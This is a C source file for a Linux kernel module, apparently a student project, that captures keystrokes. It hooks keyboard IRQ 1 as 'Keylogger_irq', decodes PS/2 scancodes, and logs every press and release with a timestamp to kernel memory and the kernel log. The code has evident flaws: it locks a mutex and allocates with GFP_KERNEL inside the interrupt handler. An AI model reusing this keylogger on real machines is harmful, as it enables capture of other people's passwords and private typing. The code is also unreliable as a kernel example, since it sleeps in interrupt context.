#include "keyboard.h"
#include "logger.h"
#include <linux/i8042.h>
#include <linux/tty.h>
#include <linux/tty_driver.h>
#include <linux/tty_flip.h>
#include <linux/input.h>
#include <linux/timekeeping.h>
#include <linux/rtc.h>
#include <linux/kernel.h>
#include <linux/mutex.h>

struct mutex mut;

#define KBD_DATA_PORT 0x60
#define KBD_STATUS_PORT 0x64
#define KBD_IRQ 1

#define CHECK_RETURN_VAL(ret) \
    do {                     \
        int status = (ret);  \
        if (status)          \
            return -status;  \
    } while (0)


///////////////////////////////////////////////////////////////////////////
// Globals

struct inputs_t inputs = {
    .inputs_lst = NULL,
    .inputs_buffer = NULL,
    .ibuf_len = 0
};

struct input_dev *kbd_input_dev;
keyboard_key_t key_table[256];

keyboard_key_t press_keys_set_1[256] = {

    // letters
    [0x1E] =    {'a',   "A",                    0x1E, PRESS, KEY_LETTERS, 0},
    [0x30] =    {'b',   "B",                    0x30, PRESS, KEY_LETTERS, 0},
    [0x2E] =    {'c',   "C",                    0x2E, PRESS, KEY_LETTERS, 0},
    [0x20] =    {'d',   "D",                    0x20, PRESS, KEY_LETTERS, 0},
    [0x12] =    {'e',   "E",                    0x12, PRESS, KEY_LETTERS, 0},
    [0x21] =    {'f',   "F",                    0x21, PRESS, KEY_LETTERS, 0},
    [0x22] =    {'g',   "G",                    0x22, PRESS, KEY_LETTERS, 0},
    [0x23] =    {'h',   "H",                    0x23, PRESS, KEY_LETTERS, 0},
    [0x17] =    {'i',   "I",                    0x17, PRESS, KEY_LETTERS, 0},
    [0x24] =    {'j',   "J",                    0x24, PRESS, KEY_LETTERS, 0},
    [0x25] =    {'k',   "K",                    0x25, PRESS, KEY_LETTERS, 0},
    [0x26] =    {'l',   "L",                    0x26, PRESS, KEY_LETTERS, 0},
    [0x32] =    {'m',   "M",                    0x32, PRESS, KEY_LETTERS, 0},
    [0x31] =    {'n',   "N",                    0x31, PRESS, KEY_LETTERS, 0},
    [0x18] =    {'o',   "O",                    0x18, PRESS, KEY_LETTERS, 0},
    [0x19] =    {'p',   "P",                    0x19, PRESS, KEY_LETTERS, 0},
    [0x10] =    {'q',   "Q",                    0x10, PRESS, KEY_LETTERS, 0},
    [0x13] =    {'r',   "R",                    0x13, PRESS, KEY_LETTERS, 0},
    [0x1F] =    {'s',   "S",                    0x1F, PRESS, KEY_LETTERS, 0},
    [0x14] =    {'t',   "T",                    0x14, PRESS, KEY_LETTERS, 0},
    [0x16] =    {'u',   "U",                    0x16, PRESS, KEY_LETTERS, 0},
    [0x2F] =    {'v',   "V",                    0x2F, PRESS, KEY_LETTERS, 0},
    [0x11] =    {'w',   "W",                    0x11, PRESS, KEY_LETTERS, 0},
    [0x2D] =    {'x',   "X",                    0x2D, PRESS, KEY_LETTERS, 0},
    [0x15] =    {'y',   "Y",                    0x15, PRESS, KEY_LETTERS, 0},
    [0x2C] =    {'z',   "Z",                    0x2C, PRESS, KEY_LETTERS, 0},
    // top keysPRESS
    [0x02] =    {'1',   "1",                    0x02, PRESS, KEY_DIGITS, 0},
    [0x03] =    {'2',   "2",                    0x03, PRESS, KEY_DIGITS, 0},
    [0x04] =    {'3',   "3",                    0x04, PRESS, KEY_DIGITS, 0},
    [0x05] =    {'4',   "4",                    0x05, PRESS, KEY_DIGITS, 0},
    [0x06] =    {'5',   "5",                    0x06, PRESS, KEY_DIGITS, 0},
    [0x07] =    {'6',   "6",                    0x07, PRESS, KEY_DIGITS, 0},
    [0x08] =    {'7',   "7",                    0x08, PRESS, KEY_DIGITS, 0},
    [0x09] =    {'8',   "8",                    0x09, PRESS, KEY_DIGITS, 0},
    [0x0A] =    {'9',   "9",                    0x0A, PRESS, KEY_DIGITS, 0},
    [0x0B] =    {'0',   "0",                    0x0B, PRESS, KEY_DIGITS, 0},
    // specials
    [0x0C] =    {'-',   "MINUS",                0x0C, PRESS, KEY_PUNCTUATION, 0},
    [0x0D] =    {'=',   "EQUALS",               0x0D, PRESS, KEY_PUNCTUATION, 0},
    [0x1A] =    {'[',   "LBRACKET",             0x1A, PRESS, KEY_PUNCTUATION, 0},
    [0x1B] =    {']',   "RBRACKET",             0x1B, PRESS, KEY_PUNCTUATION, 0},
    [0x27] =    {';',   "SEMICOLON",            0x27, PRESS, KEY_PUNCTUATION, 0},
    [0x28] =    {'\'',  "APOSTROPHE",           0x28, PRESS, KEY_PUNCTUATION, 0},
    [0x29] =    {'`',   "BACKTICK",             0x29, PRESS, KEY_PUNCTUATION, 0}, 
    [0x2B] =    {'\\',  "BACKSLASH",            0x2B, PRESS, KEY_PUNCTUATION, 0},
    [0x33] =    {',',   "COMMA",                0x33, PRESS, KEY_PUNCTUATION, 0},
    [0x34] =    {'.',   "PERIOD",               0x34, PRESS, KEY_PUNCTUATION, 0},
    [0x35] =    {'/',   "SLASH",                0x35, PRESS, KEY_PUNCTUATION, 0},
    // Space and Tab
    [0x39] =    {' ',   "SPACE",                0x39, PRESS, KEY_SPACES, 0},
    [0x0F] =    {'\t',  "TAB",                  0x0F, PRESS, KEY_SPACES, 0},
    // Num pad (main operators)
    [0x37] =    {'*',   "NUMPAD_ASTERISK",      0x37, PRESS, KEY_NUMPAD, 0},
    [0x4A] =    {'-',   "NUMPAD_MINUS",         0x4A, PRESS, KEY_NUMPAD, 0},
    [0x4E] =    {'+',   "NUMPAD_PLUS",          0x4E, PRESS, KEY_NUMPAD, 0},
    // Control 
    [0x1D] =    {0,     "LEFT_CTRL",            0x1D, PRESS, KEY_CONTROL, 0},
    [0x2A] =    {0,     "LEFT_SHIFT",           0x2A, PRESS, KEY_CONTROL, 0},
    [0x36] =    {0,     "RIGHT_SHIFT",          0x36, PRESS, KEY_CONTROL, 0},
    [0x38] =    {0,     "LEFT_ALT",             0x38, PRESS, KEY_CONTROL, 0},
    // Toggle (Lock keys)
    [0x3A] =    {0,     "CAPS_LOCK",            0x3A, PRESS, KEY_TOGGLE, 0},
    [0x45] =    {0,     "NUM_LOCK",             0x45, PRESS, KEY_TOGGLE, 0},
    [0x46] =    {0,     "SCROLL_LOCK",          0x46, PRESS, KEY_TOGGLE, 0},
    // Nav Keys
    [0x47] =    {'7',   "NUMPAD_7/HOME",        0x47, PRESS, KEY_NAVIGATION, 0},
    [0x48] =    {'8',   "NUMPAD_8/ARROW_UP",    0x48, PRESS, KEY_NAVIGATION, 0},
    [0x49] =    {'9',   "NUMPAD_9/PAGE_UP",     0x49, PRESS, KEY_NAVIGATION, 0},
    [0x4B] =    {'4',   "NUMPAD_4/ARROW_LEFT",  0x4B, PRESS, KEY_NAVIGATION, 0},
    [0x4C] =    {'5',   "NUMPAD_5/CENTER",      0x4C, PRESS, KEY_NAVIGATION, 0},
    [0x4D] =    {'6',   "NUMPAD_6/ARROW_RIGHT", 0x4D, PRESS, KEY_NAVIGATION, 0},
    [0x4F] =    {'1',   "NUMPAD_1/END",         0x4F, PRESS, KEY_NAVIGATION, 0},
    [0x50] =    {'2',   "NUMPAD_2/ARROW_DOWN",  0x50, PRESS, KEY_NAVIGATION, 0},
    [0x51] =    {'3',   "NUMPAD_3/PAGE_DOWN",   0x51, PRESS, KEY_NAVIGATION, 0},
    [0x52] =    {'0',   "NUMPAD_0/INSERT",      0x52, PRESS, KEY_NAVIGATION, 0},
    [0x53] =    {'.',   "NUMPAD_PERIOD/DELETE", 0x53, PRESS, KEY_NAVIGATION, 0},
    // Functions
    [0x3B] =    {0,     "F1",                   0x3B, PRESS, KEY_FUNCTION, 0},
    [0x3C] =    {0,     "F2",                   0x3C, PRESS, KEY_FUNCTION, 0},
    [0x3D] =    {0,     "F3",                   0x3D, PRESS, KEY_FUNCTION, 0},
    [0x3E] =    {0,     "F4",                   0x3E, PRESS, KEY_FUNCTION, 0},
    [0x3F] =    {0,     "F5",                   0x3F, PRESS, KEY_FUNCTION, 0},
    [0x40] =    {0,     "F6",                   0x40, PRESS, KEY_FUNCTION, 0},
    [0x41] =    {0,     "F7",                   0x41, PRESS, KEY_FUNCTION, 0},
    [0x42] =    {0,     "F8",                   0x42, PRESS, KEY_FUNCTION, 0},
    [0x43] =    {0,     "F9",                   0x43, PRESS, KEY_FUNCTION, 0},
    [0x44] =    {0,     "F10",                  0x44, PRESS, KEY_FUNCTION, 0},
    [0x57] =    {0,     "F11",                  0x57, PRESS, KEY_FUNCTION, 0},
    [0x58] =    {0,     "F12",                  0x58, PRESS, KEY_FUNCTION, 0},
    // Specials
    [0x0E] =    {0,     "BACKSPACE",            0x0E, PRESS, KEY_SPECIAL, 0},
    [0x1C] =    {0,     "ENTER",                0x1C, PRESS, KEY_SPECIAL, 0},
    [0x01] =    {0,     "ESCAPE",               0x01, PRESS, KEY_SPECIAL, 0},
};

///////////////////////////////////////////////////////////////////////////
// Code For init

void print_key(keyboard_key_t key) {
    printk(KERN_INFO "----------------------------\n");
    printk(KERN_INFO "KEY INFO : \n");
    printk(KERN_INFO "value : %c\n", key.value);
    printk(KERN_INFO "name : %s\n", key.name);
    printk(KERN_INFO "keycode: %x\n", key.keycode);
    printk(KERN_INFO "state: %s\n", (key.state ? "press" : "released"));
    printk(KERN_INFO "----------------------------\n");
}

void keyboard_set_key(keyboard_key_t *dst, keyboard_key_t src, int state) {
    int keycode = (state ? src.keycode : (src.keycode | 0x80));
    dst->value = src.value;
    dst->name = src.name;
    dst->keycode = keycode;
    dst->state = state;
    dst->category = src.category;
    dst->usage = src.usage;
}

void keyboard_init_key_table(void)
{
	for (int i = 0; i < 256; ++i) {
		if (press_keys_set_1[i].keycode != 0) {
			uint8_t release_code = (i | 0x80);
            keyboard_set_key(&key_table[i], press_keys_set_1[i], PRESS);
            keyboard_set_key(&key_table[release_code], press_keys_set_1[i], RELEASE);
		}
	}
}

// https://www.kernel.org/doc/html/v4.16/driver-api/input.html
int    keyboard_input_init(void) {
    kbd_input_dev = input_allocate_device();                            // Create Input Device
    kbd_input_dev->name = "My Keyboard";
    kbd_input_dev->evbit[0] = BIT_MASK(EV_KEY) | BIT_MASK(EV_REP);      // Specify the supported event types
	for (int i = 0; i < 256; ++i) {
		if (key_table[i].keycode != 0)
            set_bit(key_table[i].keycode, kbd_input_dev->keybit);       // Specify all supported keys
    }
    int status = input_register_device(kbd_input_dev);
    if (status) {
        printk(KERN_ERR "keyboard: Failed to register input device (%d)\n", status);
        input_free_device(kbd_input_dev);
        return status;
    }
    return 0;
}

void keyboard_flush_ps2(void) {
    while (inb(0x64) & 0x01) {
        inb(0x60);
    }
}

void keyboard_load_ps2_conf(int conf) {
    outb(0xAD, 0x64);               // Disable keyboard port (PS/2 port 1)
    keyboard_flush_ps2();
    outb(0x60, 0x64);               // Tell controller next byte is config byte
    outb(conf, 0x60);               // Send configuration byte
    outb(0xAE, 0x64);               // Re-enable keyboard port (PS/2 port 1)
    keyboard_flush_ps2();
}

// Code For init
///////////////////////////////////////////////////////////////////////////


struct tm keyboard_get_current_time(void)
{
    struct timespec64 ts;
    struct tm tm;

    ktime_get_real_ts64(&ts);
    time64_to_tm(ts.tv_sec, 0, &tm);

    return tm;
}

void keyboard_add_to_ibuf(char *current_input, int len) {
    size_t total_len = inputs.ibuf_len + len + 1;
    char *new_ibuf = kmalloc(total_len ,GFP_KERNEL);
    if (!new_ibuf) {
        printk(KERN_ALERT "warning no handling possible for logs: No space left on device\n");
        return;
    }
    snprintf(new_ibuf, total_len, "%s%s", inputs.inputs_buffer ? inputs.inputs_buffer : "", current_input);
    if (inputs.inputs_buffer)
        kfree(inputs.inputs_buffer);
    inputs.inputs_buffer = new_ibuf;
    inputs.ibuf_len += len;
}

void keyboard_save_input(keyboard_key_t key) {
    char    buf[128];
    print_key(key);
    struct tm tm = keyboard_get_current_time();
    int len = snprintf(buf, 128, "%d:%d:%d %s(%x) %s\n", tm.tm_hour, tm.tm_min, tm.tm_sec, key.name, key.keycode, (key.state ? "press" : "released"));
    ft_lstadd_back(&inputs.inputs_lst, ft_lstnew(ft_strdup(buf)));
    keyboard_add_to_ibuf(buf, len);
}

irqreturn_t keyboard_handler(int irq, void *dev_id)
{
    unsigned char status = inb(0x64);
    if (status & 0x01) {
        mutex_lock(&mut);
        uint8_t keycode = inb(0x60);
        keyboard_key_t key = key_table[keycode];
        if (key.keycode) {
            key_table[keycode].usage++;
            if (key.state == RELEASE)
                keycode = key.keycode - 0x80;
            else {
                keycode = key.keycode;
                logger_stats(key);
            }
            input_report_key(kbd_input_dev, keycode, key.state);
            input_sync(kbd_input_dev);
            keyboard_save_input(key);
        }
        mutex_unlock(&mut);
    }
    return IRQ_HANDLED;
}

// refer here : https://wiki.osdev.org/I8042_PS/2_Controller
int keyboard_init(void)
{
    keyboard_init_key_table();
    keyboard_load_ps2_conf(PS2_CONF);
    CHECK_RETURN_VAL(keyboard_input_init());
    CHECK_RETURN_VAL(request_irq(KBD_IRQ, keyboard_handler, 0, "Keylogger_irq", &my_misc));
    
    printk(KERN_INFO "Handler registered on irq 1, use `cat /proc/interrupts`\n");
    return 0;
}

EXPORT_SYMBOL(key_table);
EXPORT_SYMBOL(mut);
EXPORT_SYMBOL(inputs);
EXPORT_SYMBOL(kbd_input_dev);
EXPORT_SYMBOL(keyboard_init);
